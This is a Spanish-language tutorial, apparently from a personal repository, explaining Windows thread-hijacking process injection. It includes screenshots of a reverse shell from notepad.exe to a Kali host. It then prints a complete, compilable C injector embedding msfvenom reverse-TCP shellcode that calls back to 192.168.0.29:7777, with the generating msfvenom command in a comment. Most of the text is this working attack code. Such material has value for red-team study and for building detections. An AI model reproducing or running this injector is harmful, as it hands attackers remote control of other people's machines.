# threadHijacking
## Funcionamiento del programa

El programa permanece a la espera de que el usuario seleccione el proceso sobre el cual se llevará a cabo el secuestro de hilo.

En este ejemplo, se selecciona el PID del proceso `notepad.exe`, que en este caso es `7360`:

![[seleccionPID.png]]

Una vez seleccionado el proceso, se realiza directamente la inyección del `shellcode`:

![[capturas/inyeccionNotepad.png]]

Si ahora abrimos la herramienta `Process Hacker 2`, podemos observar que `notepad.exe` está estableciendo una conexión con mi máquina Kali a través del puerto `7777`:

![[capturas/networkProcessHacker.png]]

En este caso, se generó un `shellcode` para recibir una conexión de tipo `meterpreter`:

![[capturas/reverseShell.png]]

## Código

A continuación se destacan las partes más relevantes del código para comprender el funcionamiento y la correcta ejecución de la técnica de inyección mediante ``thread hijacking``.

### 1.  Inyección de `shellcode`

En la primera parte del programa, se siguen los pasos típicos de una inyección de `shellcode`:

- Se abre un `handle` al proceso víctima con `OpenProcess()`.
    
- Se reserva memoria dentro del proceso objetivo usando `VirtualAllocEx()`.
    
- Se escribe el `shellcode` en la memoria reservada mediante `WriteProcessMemory()`.

![[capturas/code1.png]]

### 2. Localización de hilos (`threads`)

La segunda fase consiste en obtener todos los hilos del sistema mediante `CreateToolhelp32Snapshot()` y recorrerlos con un bucle `do...while`, hasta encontrar un hilo perteneciente al proceso víctima. Esto se logra comparando el PID del proceso con el campo `th32OwnerProcessID` de la estructura `THREADENTRY32`.

![[capturas/code2.png]]

### 3. Secuestro y redirección del hilo

Finalmente, se realiza el secuestro del hilo. Este proceso es similar a la explotación de un desbordamiento de búfer (`buffer overflow`), ya que se manipula el flujo de ejecución del hilo:

1. Se **suspende** el hilo objetivo con `SuspendThread()`.
    
2. Se obtiene el contexto del hilo (registro de CPU) usando `GetThreadContext()`.
    
3. Se **modifica el registro `RIP`** (en sistemas x64) para que apunte a la dirección donde fue inyectado el `shellcode`. En sistemas x86, este registro sería `EIP`.
    
4. Se guarda el nuevo contexto con `SetThreadContext()`.
    
5. Finalmente, se **reanuda la ejecución del hilo** con `ResumeThread()`, lo que provoca que el hilo comience a ejecutar el código malicioso.

![[capturas/code3.png]]

## Código fuente completo

A continuación se muestra el código completo del programa. También puedes encontrar el proyecto listo para compilar en Visual Studio en mi repositorio de GitHub:

https://github.com/KikoVaquero/threadHijacking/

```
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int main() {

	//Inicializamos proceso vícitima
	DWORD pidProceso = 0;

	//Handle del snapshot de procesos actuales
	HANDLE hProcesosSnap = NULL;

	//Estructura PROCESSENTRY
	PROCESSENTRY32 pe = { 0 };

	//Hay que inicilizar siempre el tamaño
	pe.dwSize = sizeof(PROCESSENTRY32);

	//Snapshot de los procesos actuales del sistema
	hProcesosSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcesosSnap == INVALID_HANDLE_VALUE) {
		printf("[-] Error: %lu", GetLastError());
		return 1;
	}

	//Muestra el nombre del exe y el pid de cada proceso del sistema
	do {
		printf("--------------------------------------------\n");
		printf("| %ws |\t%u |\n", pe.szExeFile, pe.th32ProcessID);
	} while (Process32Next(hProcesosSnap, &pe));

	printf("[*] Selecciona un PID sobre el que realizar la inyeccion: ");
	scanf_s("%lu", &pidProceso);
	printf("\n[+] PID proceso víctima: %lu\n", pidProceso);

	//msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.29 LPORT=7777 -f c -a x64 --platform windows
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f"
		"\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x8b"
		"\x42\x3c\x48\x01\xd0\x41\x51\x66\x81\x78\x18\x0b\x02\x0f"
		"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
		"\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49\x01\xd0\x8b"
		"\x48\x18\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6"
		"\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
		"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
		"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
		"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01"
		"\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
		"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
		"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
		"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
		"\x89\xe5\x49\xbc\x02\x00\x1e\x61\xc0\xa8\x00\x1d\x41\x54"
		"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
		"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
		"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
		"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
		"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
		"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
		"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
		"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
		"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
		"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
		"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
		"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
		"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
		"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
		"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
		"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
		"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
		"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
		"\xf0\xb5\xa2\x56\xff\xd5";

	//Obtenemos el handle del proceso seleccionado
	HANDLE hProceso = OpenProcess(PROCESS_ALL_ACCESS, false, pidProceso);

	if (hProceso == NULL) {
		printf("[-] Error al abrir el proceso con PID: %lu: %lu\n", pidProceso, GetLastError());
		return 1;
	}

	printf("[+] Se ha abierto el proceso con PID: %lu\n", pidProceso);

	//Como siempre reservamos la memoria del tamaño del shellcode
	LPVOID memoriaReservada = VirtualAllocEx(hProceso, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	if (memoriaReservada == NULL) {
		printf("Error reservando la memoria: %lu\n", GetLastError());
		return 1;
	}

	printf("[+] Memoria reservada correctamente: %p\n", memoriaReservada);

	//Escribimos el shellcode en la memoria del proceso seleccionado
	if (!WriteProcessMemory(hProceso, memoriaReservada, shellcode, sizeof(shellcode), NULL)) {
		printf("[-] Error escribiendo shellcode en memoria: %lu\n", GetLastError());
		return 1;
	}

	printf("[+] Inyeccion del shellcode realizada correctamente\n");

	//Snapshot de los threads del sistema
	HANDLE hHilosSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pidProceso);
	if (hHilosSnap == INVALID_HANDLE_VALUE) {
		printf("[-] Error realizando el snapshot: %lu\n", GetLastError());
		return 1;
	}

	//Estructura THREADENTRY32
	THREADENTRY32 te = { 0 };
	//Siempre hay que inicializar el tamaño
	te.dwSize = sizeof(THREADENTRY32);

	//Handle de
	HANDLE hHiloSecuestrado = NULL;

	//Recorremos todos los hilos del sistema hasta que el PID coincida con el del proceso víctima
	do {
		if (te.th32OwnerProcessID == pidProceso) {
			hHiloSecuestrado = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);

			if (hHiloSecuestrado == NULL) {
				printf("[-] Error no se pudo abrir un hilo del proceso: %lu\n", GetLastError());
				return 1;
			}
			break;
		}
	} while (Thread32Next(hHilosSnap, &te));

	//Suspendemos el hilo
	SuspendThread(hHiloSecuestrado);

	// El context guarda los registro del hilo
	CONTEXT contexto;
	//Indica que quieres acceder a todos los registros del contexto
	contexto.ContextFlags = CONTEXT_FULL;

	//Obtienes el estado actual de los registros
	if (!GetThreadContext(hHiloSecuestrado, &contexto)) {
		printf("[-] Error obteniendo el contexto del hilo: %lu", GetLastError());
		return 1;
	}

	//En arquitecturas x64 el registro que apunta a la siguiente instrucción que se va a ejecutar es RIP
	//En arquitecturas x32 es EIP
	contexto.Rip = (DWORD_PTR)memoriaReservada;

	//Guarda los cambios en los registros del hilo
	if (!SetThreadContext(hHiloSecuestrado, &contexto)) {
		printf("[-] Error estableciendo el contexto del hilo: %lu", GetLastError());
		return 1;
	}

	//Se reanuda la ejecución del hilo una vez modificado el RIP para que apunte a la dirección de memoria donde escribimos nuestro shellcode
	ResumeThread(hHiloSecuestrado);

	//Limpiamos
	CloseHandle(hHiloSecuestrado);
	CloseHandle(hHilosSnap);
	CloseHandle(hProceso);

	printf("[+] Limpiando handles...");

	return 0;
}

```
